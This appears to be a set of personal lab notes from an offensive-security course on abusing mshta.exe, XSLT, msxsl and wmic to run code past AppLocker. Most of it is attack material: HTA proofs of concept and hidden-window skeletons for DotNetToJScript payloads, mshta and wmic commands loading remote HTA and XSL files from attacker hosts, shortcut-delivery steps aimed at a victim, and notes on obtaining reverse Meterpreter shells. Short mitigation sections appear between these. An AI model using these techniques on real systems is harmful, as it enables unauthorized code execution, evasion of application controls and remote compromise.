While `mshta.exe` is a legitimate tool, it can be abused by attackers to run malicious scripts. This makes it a common vector for malware and other malicious activities. 

#### Examples of Abuse
- **Running Malicious Scripts**: Attackers can use `mshta.exe` to execute malicious JavaScript or VBScript directly from the command line or via a malicious HTA file.
- **Bypassing Security Measures**: Due to its legitimate nature, `mshta.exe` can sometimes bypass security software that might block more obvious malicious executables.

#### Example of Malicious Use
An attacker might craft a command to download and execute a malicious script:
```sh
mshta.exe "http://malicious.website/malicious.hta"
```

#### Mitigation and Defense
- **Monitoring**: Keep an eye on the execution of `mshta.exe` on endpoints. It is unusual for most users to execute HTA files frequently.
- **Restrict Execution**: Implement policies to restrict the use of `mshta.exe` if it is not required in your environment.
- **Endpoint Protection**: Use endpoint protection solutions that can detect and block the execution of suspicious scripts and HTA files.

By understanding `mshta.exe` and its potential for abuse, you can better protect your systems from associated threats.


#### POC
```js
<html> 
<head> 
<script language="JScript">
<!--- PASTE JSCRIPT PAYLOAD BELOW --->
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
<!--- PASTE JSCRIPT ABOVE--->
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

```cmd
mshta test.hta
```


##### 8.5.1.1 Q2
- Could not get sharpshooter to work with a payload
- ended up crafting my own hta skeleton 
```html
<head>
<script language="JScript">

<!-- ADD output from DotNetToJScript here. -->

</script>
<hta:application /> 
</head>
<body>
</body>
</html>
```
- inserted reverse_https metepreter payload
- C# code to inject was taken from my InjectToJscript skeleton
```cmd
 .\DotNetToJScript\DotNetToJScript\bin\x64\Release\DotNetToJScript.exe InjectToJscriptCsWin32.dll --lang=Jscript --ver=2 -o Downloads\test.hta' -c InjectToJscriptCsWin32.Class1
```
- Better hta skeleton
```html
<html>
<head>
<script language="JScript">

<!-- ADD output from DotNetToJScript here. -->

window.resizeTo(0, 0);
window.moveTo(-32000, -32000);
</script>
<hta:application 
    showInTaskbar="no" 
    border="none" 
    caption="no" 
    maximizeButton="no" 
    minimizeButton="no" 
    sysMenu="no" 
    scroll="no"
/>
</head>
<body onload="window.blur();">
</body>
</html>
```

### XSL Transform
#### Malicious use
- start webserver
- save POC in web root  
- create a shortcut `C:\\Windows\\System32\\mshta.exe http://<attacker ip>/test.hta` and name it
- have to get shortcut file on victim's machine
- Can use DotNetToJscript or SuperSharpShooter to generate payload to plant in the hta file

Using XSLT (Extensible Stylesheet Language Transformations) to bypass AppLocker can be a technique employed by attackers to execute arbitrary code in an environment where AppLocker policies are enforced to restrict executable files. Here's a step-by-step explanation of how this technique might be used:

#### What is XSLT?
XSLT is a language for transforming XML documents into other formats such as HTML, text, or another XML document. 

#### Using XSLT to Execute Code
1. **Craft an XSLT File**: The attacker creates an XSLT file that contains embedded script or commands to be executed. XSLT has elements like `<msxsl:script>` that can contain JScript or VBScript.

2. **Invoke the XSLT File**: The attacker uses a legitimate Windows utility (like `msxsl.exe` or Internet Explorer) to process the malicious XSLT file.

Here's an example of an XSLT file (`malicious.xsl`) with embedded JScript:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:msxsl="urn:schemas-microsoft-com:xslt" xmlns:user="http://mycompany.com/mynamespace">
    <msxsl:script language="JScript" implements-prefix="user">
        <![CDATA[
        function execute() {
            var shell = new ActiveXObject("WScript.Shell");
            shell.Run("cmd.exe /c calc.exe");
        }
        ]]>
    </msxsl:script>
    <xsl:template match="/">
        <xsl:value-of select="user:execute()"/>
    </xsl:template>
</xsl:stylesheet>
```

#### Steps to Bypass AppLocker
1. **Create the Malicious XSLT File**: Save the above XSLT code into a file named `malicious.xsl`.

2. **Invoke the XSLT File**: Use `msxsl.exe` or Internet Explorer to run the XSLT file. For example:

```sh
msxsl.exe input.xml malicious.xsl
```

or

```sh
mshta.exe "about:<html><head><xml id='xsl' src='file:///C:/path/to/malicious.xsl'/><script>new ActiveXObject('Msxml2.DOMDocument.6.0').transformNodeToObject(new ActiveXObject('Msxml2.DOMDocument.6.0').loadXML('<root/>'), document.all.xsl);</script></head><body></body></html>"
```

or 

```cmd
wmic process get brief /format:"http://192.168.0.1/test.xsl"
```

or 

```cmd
wmic process call create "wmic os get /format:'file://C:/path/to/malicious.xsl'"
```

#### Security Implications
- **Bypassing Restrictions**: Since `msxsl.exe` and `mshta.exe` are typically not restricted by AppLocker policies, they can be used to execute arbitrary code through the XSLT transformation process.
- **Misuse of Legitimate Tools**: This technique abuses legitimate system tools, making it harder for security software to detect the malicious activity.

#### Mitigation Strategies
- **Restrict Executable Use**: Restrict the use of tools like `msxsl.exe` and `mshta.exe` if they are not needed in your environment.
- **AppLocker Configuration**: Ensure that AppLocker policies are configured to also restrict the execution of script processors and other tools that can be used to bypass restrictions.
- **Monitoring and Alerts**: Monitor for unusual use of tools like `msxsl.exe` and `mshta.exe` and set up alerts for their execution.

By understanding how XSLT can be used to bypass AppLocker, you can better protect your systems by implementing more comprehensive security measures and monitoring.


##### 8.5.2 
*Note:* `wmic` needed to be executed from cmd shell and not powershell
Used the xsl stylesheet and copied in the DotNetToJscript code to get a reverse meterpreter shell.

### TODO: Use Sliver to bypass Applocker restrictions
